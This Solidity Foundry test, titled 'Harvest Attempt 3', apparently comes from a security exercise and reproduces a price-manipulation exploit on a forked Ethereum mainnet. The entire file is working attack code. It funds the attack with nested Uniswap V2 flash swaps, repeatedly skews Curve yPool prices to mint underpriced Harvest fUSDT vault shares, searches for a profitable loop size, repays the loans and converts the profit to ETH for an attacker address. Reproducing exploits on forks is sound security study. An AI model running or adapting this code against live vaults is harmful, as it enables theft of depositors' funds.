// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function coins(int128 i) external view returns (address);
    function underlying_coins(int128 i) external view returns (address);
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address account) external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
}

interface ICurveStrategy {
    function depositArbCheck() external view returns (bool);
    function investedUnderlyingBalance() external view returns (uint256);
    function curvePriceCheckpoint() external view returns (uint256);
    function underlyingValueFromYCrv(uint256 ycrvBalance) external view returns (uint256);
    function arbTolerance() external view returns (uint256);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Router {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

/// @title Harvest Attempt 3
/// @notice Hypothesis: Attempt2's tuned Curve/Harvest loop is viable on the
/// fork, and the only blocking issue is the funding leg. Replacing the missing
/// Aave V2 source with nested Uniswap V2 flash-swaps from the canonical
/// `USDT/WETH` and `USDC/WETH` pairs should let the same loop finish, repay,
/// and convert stablecoin profit into ETH.
contract Attempt3 is Test {
    struct Plan {
        uint256 swapSize;
        uint256 iterations;
        uint256 grossUsdt;
        int256 expectedNetUsdt;
    }

    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    IHVault constant FUSDT_VAULT = IHVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    ICurveStrategy constant STRATEGY = ICurveStrategy(0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c);
    ICurveYPool constant CURVE_YPOOL = ICurveYPool(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IUniswapV2Pair constant USDT_WETH_PAIR = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair constant USDC_WETH_PAIR = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Router constant UNISWAP_V2 = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    int128 constant IDX_DAI = 0;
    int128 constant IDX_USDC = 1;
    int128 constant IDX_USDT = 2;
    int128 constant IDX_TUSD = 3;

    uint256 constant FORK_BLOCK = 11_128_633;
    uint256 constant PROBE_MIN = 5_000_000e6;
    uint256 constant PROBE_MAX = 20_000_000e6;
    uint256 constant PROBE_STEP = 1_000_000e6;
    uint256 constant OUTER_USDT_FLASH = 50_000_000e6;
    uint256 constant ITER_MIN = 20;
    uint256 constant ITER_MAX = 100;
    uint256 constant ITER_STEP = 5;
    uint256 constant USDT_BUFFER = 10_000e6;
    uint256 constant YCRV_UNIT = 1e18;

    uint256 internal swapSize;
    uint256 internal flashUsdc;
    uint256 internal iterations;
    uint256 internal usdtOwed;
    uint256 internal usdcOwed;

    function setUp() public {
        vm.createSelectFork("ch2", FORK_BLOCK);

        vm.label(ATTACKER, "StudentEOA");
        vm.label(address(FUSDT_VAULT), "Harvest_fUSDT");
        vm.label(address(STRATEGY), "HarvestStrategy");
        vm.label(address(CURVE_YPOOL), "Curve_yPool");
        vm.label(address(USDT_WETH_PAIR), "UniV2_USDT_WETH");
        vm.label(address(USDC_WETH_PAIR), "UniV2_USDC_WETH");
        vm.label(address(UNISWAP_V2), "UniV2Router");
        vm.label(USDC, "USDC");
        vm.label(USDT, "USDT");
        vm.label(WETH, "WETH");

        vm.deal(ATTACKER, 1 ether);

        _forceApprove(USDC, address(CURVE_YPOOL), type(uint256).max);
        _forceApprove(USDT, address(CURVE_YPOOL), type(uint256).max);
        _forceApprove(USDT, address(FUSDT_VAULT), type(uint256).max);
        _forceApprove(USDC, address(UNISWAP_V2), type(uint256).max);
        _forceApprove(USDT, address(UNISWAP_V2), type(uint256).max);
    }

    function test_exploit() public {
        _logPreflight();

        assertEq(CURVE_YPOOL.underlying_coins(IDX_USDC), USDC, "underlying USDC index mismatch");
        assertEq(CURVE_YPOOL.underlying_coins(IDX_USDT), USDT, "underlying USDT index mismatch");
        assertEq(USDT_WETH_PAIR.token0(), WETH, "usdt pair token0 mismatch");
        assertEq(USDT_WETH_PAIR.token1(), USDT, "usdt pair token1 mismatch");
        assertEq(USDC_WETH_PAIR.token0(), USDC, "usdc pair token0 mismatch");
        assertEq(USDC_WETH_PAIR.token1(), WETH, "usdc pair token1 mismatch");

        Plan memory plan = _findNetPositivePlan();
        swapSize = plan.swapSize;
        flashUsdc = plan.swapSize;
        iterations = plan.iterations;

        console.log("[plan] swapSize:", plan.swapSize);
        console.log("[plan] iterations:", plan.iterations);
        console.log("[plan] gross usdt:", plan.grossUsdt);
        console.log("[plan] expected net usdt:", uint256(plan.expectedNetUsdt));
        console.log("[plan] usdt flash:", OUTER_USDT_FLASH);
        console.log("[plan] usdc flash:", flashUsdc);

        uint256 nativeBefore = ATTACKER.balance;
        console.log("[start] attacker ETH:", nativeBefore);

        _startFlash();

        uint256 usdcProfit = IERC20Like(USDC).balanceOf(address(this));
        uint256 usdtProfit = IERC20Like(USDT).balanceOf(address(this));
        console.log("[post-flash] usdc profit:", usdcProfit);
        console.log("[post-flash] usdt profit:", usdtProfit);

        _swapStableProfitToEth();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker ETH:", nativeAfter);
        console.log("[delta] attacker ETH:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "native balance must strictly increase");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(sender == address(this), "bad sender");

        if (msg.sender == address(USDT_WETH_PAIR)) {
            require(amount0 == 0, "unexpected weth flash");
            require(amount1 == OUTER_USDT_FLASH, "unexpected usdt flash");

            usdtOwed = _pairRepayment(amount1);

            console.log("[flash-usdt] borrowed:", amount1);
            console.log("[flash-usdt] owed:", usdtOwed);

            USDC_WETH_PAIR.swap(flashUsdc, 0, address(this), hex"01");

            uint256 usdtBal = IERC20Like(USDT).balanceOf(address(this));
            console.log("[flash-usdt] repay bal:", usdtBal);
            require(usdtBal >= usdtOwed, "USDT shortfall");

            _safeTransfer(USDT, address(USDT_WETH_PAIR), usdtOwed);
            return;
        }

        if (msg.sender == address(USDC_WETH_PAIR)) {
            require(amount0 == flashUsdc, "unexpected usdc flash");
            require(amount1 == 0, "unexpected weth flash");

            usdcOwed = _pairRepayment(amount0);

            console.log("[flash-usdc] borrowed:", amount0);
            console.log("[flash-usdc] owed:", usdcOwed);

            _runLoop(iterations, swapSize);
            _rebalanceForRepayment(usdcOwed, usdtOwed);

            uint256 usdcBal = IERC20Like(USDC).balanceOf(address(this));
            uint256 usdtBal = IERC20Like(USDT).balanceOf(address(this));

            console.log("[post-loop] usdc balance:", usdcBal);
            console.log("[post-loop] usdt balance:", usdtBal);
            require(usdcBal >= usdcOwed, "USDC shortfall");
            require(usdtBal >= usdtOwed, "USDT shortfall");

            _safeTransfer(USDC, address(USDC_WETH_PAIR), usdcOwed);
            return;
        }

        revert("unknown pair");
    }

    receive() external payable {}

    function previewLoop(uint256 candidateSwap, uint256 testIterations) external returns (bool success, uint256 grossUsdtOut) {
        require(msg.sender == address(this), "self only");

        deal(USDC, address(this), candidateSwap);
        deal(USDT, address(this), candidateSwap + USDT_BUFFER);

        uint256 startUsdtEquivalent = candidateSwap
            + USDT_BUFFER
            + CURVE_YPOOL.get_dy_underlying(IDX_USDC, IDX_USDT, candidateSwap);

        _runLoop(testIterations, candidateSwap);

        uint256 endUsdtEquivalent = IERC20Like(USDT).balanceOf(address(this))
            + CURVE_YPOOL.get_dy_underlying(IDX_USDC, IDX_USDT, IERC20Like(USDC).balanceOf(address(this)));

        success = true;
        grossUsdtOut = endUsdtEquivalent > startUsdtEquivalent ? endUsdtEquivalent - startUsdtEquivalent : 0;
    }

    function _startFlash() internal {
        USDT_WETH_PAIR.swap(0, OUTER_USDT_FLASH, address(this), hex"02");
    }

    function _logPreflight() internal view {
        (uint112 usdtPairWethReserve, uint112 usdtPairUsdtReserve,) = USDT_WETH_PAIR.getReserves();
        (uint112 usdcPairUsdcReserve, uint112 usdcPairWethReserve,) = USDC_WETH_PAIR.getReserves();

        console.log("[pre] chainId:", block.chainid);
        console.log("[pre] fork block:", block.number);
        console.log("[pre] block gas limit:", block.gaslimit);
        console.log("[pre] pool coin[0]:", CURVE_YPOOL.coins(IDX_DAI));
        console.log("[pre] pool coin[1]:", CURVE_YPOOL.coins(IDX_USDC));
        console.log("[pre] pool coin[2]:", CURVE_YPOOL.coins(IDX_USDT));
        console.log("[pre] pool coin[3]:", CURVE_YPOOL.coins(IDX_TUSD));
        console.log("[pre] underlying coin[0]:", CURVE_YPOOL.underlying_coins(IDX_DAI));
        console.log("[pre] underlying coin[1]:", CURVE_YPOOL.underlying_coins(IDX_USDC));
        console.log("[pre] underlying coin[2]:", CURVE_YPOOL.underlying_coins(IDX_USDT));
        console.log("[pre] underlying coin[3]:", CURVE_YPOOL.underlying_coins(IDX_TUSD));
        console.log("[pre] checkpoint:", STRATEGY.curvePriceCheckpoint());
        console.log("[pre] spot:", STRATEGY.underlyingValueFromYCrv(YCRV_UNIT));
        console.log("[pre] arbTolerance:", STRATEGY.arbTolerance());
        console.log("[pre] depositArbCheck:", STRATEGY.depositArbCheck());
        console.log("[pre] vault underlying:", FUSDT_VAULT.underlyingBalanceWithInvestment());
        console.log("[pre] vault PPS:", FUSDT_VAULT.getPricePerFullShare());
        console.log("[pre] strategy invested:", STRATEGY.investedUnderlyingBalance());
        console.log("[pre] usdt pair reserve weth:", uint256(usdtPairWethReserve));
        console.log("[pre] usdt pair reserve usdt:", uint256(usdtPairUsdtReserve));
        console.log("[pre] usdc pair reserve usdc:", uint256(usdcPairUsdcReserve));
        console.log("[pre] usdc pair reserve weth:", uint256(usdcPairWethReserve));
    }

    function _findNetPositivePlan() internal returns (Plan memory bestPlan) {
        uint256 fixedUsdtFee = _pairFee(OUTER_USDT_FLASH);

        for (uint256 candidate = PROBE_MAX; candidate >= PROBE_MIN; candidate -= PROBE_STEP) {
            (bool okOne, uint256 grossOne) = _simulate(candidate, 1);

            console.log("[probe] candidate:", candidate);
            console.log("[probe] one-iter success:", okOne);
            console.log("[probe] one-iter gross usdt:", grossOne);

            if (okOne && grossOne > 0) {
                uint256 totalFees = fixedUsdtFee + _pairFee(candidate);
                uint256 suggestedIterations = _roundUp(_max(ITER_MIN, (totalFees / grossOne) + 5), ITER_STEP);

                for (uint256 iter = suggestedIterations; iter <= ITER_MAX; iter += ITER_STEP) {
                    (bool ok, uint256 grossUsdtOut) = _simulate(candidate, iter);
                    int256 expectedNetUsdt = ok ? int256(grossUsdtOut) - int256(totalFees) : type(int256).min;

                    console.log("[probe] iterations:", iter);
                    console.log("[probe] success:", ok);
                    console.log("[probe] gross usdt:", grossUsdtOut);

                    if (ok && expectedNetUsdt > 0) {
                        bestPlan = Plan({
                            swapSize: candidate,
                            iterations: iter,
                            grossUsdt: grossUsdtOut,
                            expectedNetUsdt: expectedNetUsdt
                        });
                        return bestPlan;
                    }
                }
            }

            if (candidate == PROBE_MIN) {
                break;
            }
        }

        revert("no net-positive UniV2 plan found");
    }

    function _runLoop(uint256 testIterations, uint256 candidateSwap) internal {
        for (uint256 i; i < testIterations; ++i) {
            uint256 usdtBefore = IERC20Like(USDT).balanceOf(address(this));
            uint256 sharesBefore = FUSDT_VAULT.balanceOf(address(this));
            uint256 ppsBefore = FUSDT_VAULT.getPricePerFullShare();

            CURVE_YPOOL.exchange_underlying(IDX_USDC, IDX_USDT, candidateSwap, 0);

            uint256 pumpedUsdt = IERC20Like(USDT).balanceOf(address(this)) - usdtBefore;
            require(pumpedUsdt > 0, "pump zero");
            require(STRATEGY.depositArbCheck(), "arb check failed");

            FUSDT_VAULT.deposit(pumpedUsdt);
            uint256 sharesMinted = FUSDT_VAULT.balanceOf(address(this)) - sharesBefore;
            require(sharesMinted > 0, "shares zero");

            CURVE_YPOOL.exchange_underlying(IDX_USDT, IDX_USDC, candidateSwap, 0);
            FUSDT_VAULT.withdraw(sharesMinted);

            console.log("[iter] index:", i);
            console.log("[iter] pumped usdt:", pumpedUsdt);
            console.log("[iter] shares minted:", sharesMinted);
            console.log("[iter] pps before:", ppsBefore);
            console.log("[iter] pps after:", FUSDT_VAULT.getPricePerFullShare());
            console.log("[iter] usdc bal:", IERC20Like(USDC).balanceOf(address(this)));
            console.log("[iter] usdt bal:", IERC20Like(USDT).balanceOf(address(this)));
        }
    }

    function _simulate(uint256 candidate, uint256 testIterations) internal returns (bool ok, uint256 grossUsdtOut) {
        uint256 snapshot = vm.snapshotState();

        try this.previewLoop(candidate, testIterations) returns (bool success, uint256 grossOut) {
            ok = success;
            grossUsdtOut = grossOut;
        } catch {
            ok = false;
        }

        require(vm.revertToStateAndDelete(snapshot), "simulate revert failed");
    }

    function _rebalanceForRepayment(uint256 targetUsdc, uint256 targetUsdt) internal {
        uint256 usdcBal = IERC20Like(USDC).balanceOf(address(this));
        uint256 usdtBal = IERC20Like(USDT).balanceOf(address(this));

        if (usdcBal < targetUsdc) {
            uint256 deficit = targetUsdc - usdcBal;
            uint256 usdtIn = _findInputForOutput(IDX_USDT, IDX_USDC, deficit, 1e6, usdtBal);

            console.log("[rebalance] usdc deficit:", deficit);
            console.log("[rebalance] usdt in:", usdtIn);

            CURVE_YPOOL.exchange_underlying(IDX_USDT, IDX_USDC, usdtIn, 0);
        }

        usdcBal = IERC20Like(USDC).balanceOf(address(this));
        usdtBal = IERC20Like(USDT).balanceOf(address(this));

        if (usdtBal < targetUsdt) {
            uint256 deficit = targetUsdt - usdtBal;
            uint256 usdcIn = _findInputForOutput(IDX_USDC, IDX_USDT, deficit, 1e6, usdcBal);

            console.log("[rebalance] usdt deficit:", deficit);
            console.log("[rebalance] usdc in:", usdcIn);

            CURVE_YPOOL.exchange_underlying(IDX_USDC, IDX_USDT, usdcIn, 0);
        }
    }

    function _findInputForOutput(
        int128 tokenIn,
        int128 tokenOut,
        uint256 desiredOut,
        uint256 low,
        uint256 high
    ) internal view returns (uint256 best) {
        best = high;

        while (low <= high) {
            uint256 mid = low + ((high - low) / 2);
            uint256 out = CURVE_YPOOL.get_dy_underlying(tokenIn, tokenOut, mid);

            if (out >= desiredOut) {
                best = mid;
                if (mid == 0) {
                    break;
                }
                high = mid - 1;
            } else {
                low = mid + 1;
            }
        }
    }

    function _swapStableProfitToEth() internal {
        uint256 usdtProfit = IERC20Like(USDT).balanceOf(address(this));
        if (usdtProfit > 0) {
            address[] memory path = new address[](2);
            path[0] = USDT;
            path[1] = WETH;
            UNISWAP_V2.swapExactTokensForETH(usdtProfit, 0, path, ATTACKER, block.timestamp + 60);
        }

        uint256 usdcProfit = IERC20Like(USDC).balanceOf(address(this));
        if (usdcProfit > 0) {
            address[] memory path = new address[](2);
            path[0] = USDC;
            path[1] = WETH;
            UNISWAP_V2.swapExactTokensForETH(usdcProfit, 0, path, ATTACKER, block.timestamp + 60);
        }
    }

    function _pairFee(uint256 amountOut) internal pure returns (uint256) {
        return _pairRepayment(amountOut) - amountOut;
    }

    function _pairRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _roundUp(uint256 value, uint256 step) internal pure returns (uint256) {
        if (value % step == 0) {
            return value;
        }
        return value + (step - (value % step));
    }

    function _max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0), "approve reset");
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount), "approve set");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount), "transfer");
    }

    function _callOptionalReturn(address token, bytes memory data, string memory err) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, err);

        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), err);
        }
    }
}
